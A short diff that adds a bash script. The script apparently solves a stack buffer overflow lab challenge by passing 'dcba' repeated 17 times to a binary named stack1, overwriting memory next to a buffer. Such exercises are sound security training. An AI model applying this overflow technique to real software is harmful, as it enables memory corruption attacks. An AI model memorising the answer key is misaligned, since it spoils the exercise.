@@ -1,0 +1,2 @@
+#!/bin/bash
+./stack1 $(python -c "print 'dcba'*17")
